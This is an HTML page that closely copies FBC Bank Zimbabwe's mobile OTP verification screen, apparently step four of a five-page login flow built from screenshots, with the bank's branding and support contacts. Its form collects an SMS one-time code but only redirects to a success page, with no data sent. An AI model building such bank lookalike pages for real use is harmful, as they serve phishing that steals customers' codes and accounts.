<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>FBC Bank Zimbabwe - OTP Verification</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Plus Jakarta Sans', system-ui, -apple-system, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #002f82;
    }
    .fbc-bg {
      background: linear-gradient(180deg, #0047ba 0%, #0040ad 50%, #002f82 100%);
    }
    .pill-input {
      border: 2px solid rgba(255, 255, 255, 0.85);
      background: transparent;
      color: #ffffff;
      text-align: center;
      border-radius: 9999px;
      outline: none;
      transition: all 0.2s ease;
    }
    .pill-input:focus {
      border-color: #ffffff;
      box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.3);
    }
    .pill-input::placeholder {
      color: rgba(255, 255, 255, 0.65);
    }
    .pill-btn {
      background-color: #ffffff;
      color: #004bbd;
      font-weight: 700;
      border-radius: 9999px;
      transition: all 0.15s ease;
    }
    .pill-btn:hover {
      background-color: #f1f5f9;
      transform: translateY(-1px);
    }
    .pill-btn:active {
      transform: translateY(0);
    }
  </style>
</head>
<body class="min-h-screen flex items-center justify-center p-3 sm:p-6">

  <!-- Mobile screen container directly matching IMG-20261104-WA0002 -->
  <div class="relative w-full max-w-sm min-h-[640px] fbc-bg text-white flex flex-col justify-between overflow-hidden rounded-[36px] shadow-2xl border border-blue-400/20">
    
    <!-- Top back link -->
    <div class="px-6 pt-5 flex items-center justify-between z-20">
      <a href="login.html" class="text-white/80 hover:text-white text-xs">&larr; Back</a>
      <span class="text-[10px] text-blue-200 uppercase tracking-widest font-semibold">Page 4 of 5</span>
    </div>

    <!-- Center Section -->
    <div class="px-8 py-6 flex flex-col items-center text-center z-10 w-full my-auto">
      <!-- 1. FBC Logo -->
      <div class="mb-6">
        <img src="/assets/aistudio/IMG-20261106-WA0006_9fd08494.jpg" alt="FBC Bank Logo" class="h-16 w-auto object-contain drop-shadow-md rounded-lg" onerror="this.src='https://placehold.co/150x60/004bbd/ffffff?text=FBC'" />
      </div>

      <!-- 2. Heading -->
      <h2 class="text-white text-2xl font-bold tracking-tight mb-3">
        OTP Verification
      </h2>

      <!-- 3. Subtext matching screenshot -->
      <p class="text-white/90 text-xs sm:text-sm font-normal leading-relaxed max-w-xs mb-4">
        Your OTP will be automatically verified. You can still enter the OTP code you receive via SMS manually.
      </p>

      <!-- 4. Reference Code matching screenshot -->
      <p class="text-white/80 font-mono text-sm tracking-widest mb-6">
        Ref: <span class="font-bold text-white">9vXfk</span>
      </p>

      <!-- 5. Form -->
      <form onsubmit="handleOtpSubmit(event)" class="w-full space-y-5">
        <input type="text" id="otpCode" required maxlength="6" placeholder="OTP code" class="pill-input w-full h-14 px-6 text-xl font-mono tracking-widest" />
        <button type="submit" id="verifyBtn" class="pill-btn w-full h-14 text-lg font-bold shadow-xl cursor-pointer">
          Verify
        </button>
      </form>

      <!-- Resend Countdown -->
      <div class="mt-4 text-xs text-blue-200">
        <span>Didn't receive code? </span>
        <button id="resendBtn" onclick="resendOtp()" class="font-bold text-white underline hover:text-blue-100 cursor-pointer">
          Resend in <span id="timer">45</span>s
        </button>
      </div>
    </div>

    <!-- Wave Graphic and Get Support Icon matching screenshot -->
    <div class="relative w-full z-10">
      <svg viewBox="0 0 500 150" class="w-full h-auto text-white fill-current pointer-events-none" preserveAspectRatio="none">
        <path d="M 0,90 C 150,140 320,30 500,100 L 500,150 L 0,150 Z" fill="#eaf2fb" />
        <path d="M 0,120 C 180,160 320,60 500,110 L 500,150 L 0,150 Z" fill="#ffffff" />
      </svg>

      <!-- Headset Icon with Get Support -->
      <div class="absolute inset-x-0 bottom-4 flex flex-col items-center justify-center z-20">
        <button onclick="alert('FBC 24/7 Client Support Centre\nToll-Free (All Networks): 220\nWhatsApp Banking: +263 77 215 2612\nDirect Line: +263 242 700 312\nEmail: help@fbc.co.zw')" class="flex flex-col items-center gap-1 focus:outline-none group cursor-pointer">
          <svg viewBox="0 0 24 24" class="w-7 h-7 text-[#004bbd] stroke-current fill-none stroke-[2.2]">
            <path d="M3 18v-6a9 9 0 0 1 18 0v6"></path>
            <path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3zM3 19a2 2 0 0 0 2 2h1a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z"></path>
          </svg>
          <span class="text-[#004bbd] font-semibold text-xs group-hover:underline">Get Support</span>
        </button>
      </div>
    </div>

    <!-- Standard Copyright -->
    <div class="bg-white py-2 px-4 text-center text-[10px] text-slate-500 border-t border-slate-100 z-20">
      &copy; 2026 FBC Holdings Limited. All rights reserved.
    </div>
  </div>

  <script>
    let timeLeft = 45;
    const timerElem = document.getElementById('timer');
    const resendBtn = document.getElementById('resendBtn');

    const interval = setInterval(() => {
      if (timeLeft > 0) {
        timeLeft--;
        timerElem.innerText = timeLeft;
      } else {
        clearInterval(interval);
        resendBtn.innerText = 'Resend Code';
      }
    }, 1000);

    function resendOtp() {
      if (timeLeft <= 0) {
        timeLeft = 45;
        resendBtn.innerHTML = 'Resend in <span id="timer">45</span>s';
      }
    }

    function handleOtpSubmit(e) {
      e.preventDefault();
      const btn = document.getElementById('verifyBtn');
      btn.innerText = 'Verifying...';
      btn.disabled = true;

      setTimeout(() => {
        window.location.href = 'success.html';
      }, 1000);
    }
  </script>
</body>
</html>
